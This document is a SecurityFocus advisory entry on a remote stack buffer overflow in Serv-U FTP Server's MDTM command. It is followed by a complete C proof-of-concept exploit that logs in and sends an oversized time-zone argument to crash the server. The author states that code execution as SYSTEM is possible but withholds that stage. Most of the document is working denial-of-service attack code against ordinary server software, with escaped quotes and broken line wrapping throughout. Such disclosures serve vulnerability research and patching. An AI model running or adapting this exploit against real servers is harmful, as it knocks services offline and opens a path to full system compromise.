source: http://www.securityfocus.com/bid/9751/info
  
Serv-U FTP Server has been reported prone to a remote stack based buffer overflow vulnerability when handling time zone arguments passed to the MDTM FTP command.
  
The problem exists due to insufficient bounds checking. Ultimately an attacker may leverage this issue to have arbitrary instructions executed in the context of the SYSTEM user.

/* serv-u-mdtm-expl.c - Serv-U \"MDTM\" buffer overflow
PoC DoS exploit.
 *
 * This program will send an overly large filename
parameter when calling
 * the Serv-U FTP MDTM command.  Although arbitrary
code execution is
 * possible upon successful execution of this
vulnerability, the vendor has
 * not yet released a patch, so releasing such an
exploit could be disastrous
 * in the hands of script kiddies.  I might release a
full exploit to the
 * public when a patch/fix is issued by the vendor of
Serv-U.  This PoC
 * exploit will simply crash the Serv-U server.
 *
 * This vulnerability was discovered by bkbll, you can
read his advisory on
 * the issue here:
<http://www.cnhonker.com/advisory/serv-u.mdtm.txt>
 *
 * This vulnerability requires a valid login and
password to exploit!  This
 * PoC does not check to see if you supplied a correct
login and password.
 *
 * I do not take responsibility for this code.
 *
 * -shaun2k2
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>

int main(int argc, char *argv[]) {
        if(argc < 5) {
                printf(\"Serv-U \'MDTM\' buffer overflow
DoS exploit.\\n\");
                printf(\"by shaun2k2 -
<shaunige@yahoo.co.uk>.\\n\\n\");
                printf(\"Usage: %s <host> <port>
<login> <password>\\n\", argv[0]);
                exit(-1);
        }

        int sock;
        char *explbuf;
        char loginbuf[100];
        char passwdbuf[100];
        struct sockaddr_in dest;
        struct hostent *he;

        /* lookup IP address of supplied hostname. */
        if((he = gethostbyname(argv[1])) == NULL) {
                printf(\"Couldn\'t resolve %s!\\n\",
argv[1]);
                exit(-1);
        }

        /* create socket. */
        if((sock = socket(AF_INET, SOCK_STREAM, 0)) <
0) {
                perror(\"socket()\");
                exit(-1);
        }

        /* fill in address struct. */
        dest.sin_family = AF_INET;
        dest.sin_port = htons(atoi(argv[2]));
        dest.sin_addr = *((struct in_addr
*)he->h_addr);

        printf(\"Serv-U \'MDTM\' buffer overflow DoS
exploit.\\n\");
        printf(\"by shaun2k2 -
<shaunige@yahoo.co.uk>.\\n\\n\");

        printf(\"Crafting exploit buffer...\\n\\n\");
        /* craft exploit buffers. */
        sprintf(loginbuf, \"USER %s\\n\", argv[3]);
        sprintf(passwdbuf, \"PASS %s\\n\", argv[4]);
        explbuf = \"MDTM
20031111111111+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/test.txt\";


        printf(\"[+] Connecting...\\n\");
        if(connect(sock, (struct sockaddr *)&dest,
sizeof(struct sockaddr)) < 0) {
                perror(\"connect()\");
                exit(-1);
        }

        printf(\"[+] Connected!\\n\\n\");

        printf(\"[+] Sending exploit buffers...\\n\");
        sleep(1); /* give the serv-u server time to
sort itself out. */
        send(sock, loginbuf, strlen(loginbuf), 0);
        sleep(2); /* wait for 2 secs. */
        send(sock, passwdbuf, strlen(passwdbuf), 0);
        sleep(2); /* wait before sending large MDTM
command. */
        send(sock, explbuf, strlen(explbuf), 0);
        sleep(1); /* wait before closing the socket.
*/
        printf(\"[+] Exploit buffer sent!\\n\\n\");

        close(sock);

        printf(\"[+] Done!  Check if the Serv-U server
has crashed.\\n\");

        return(0);
}

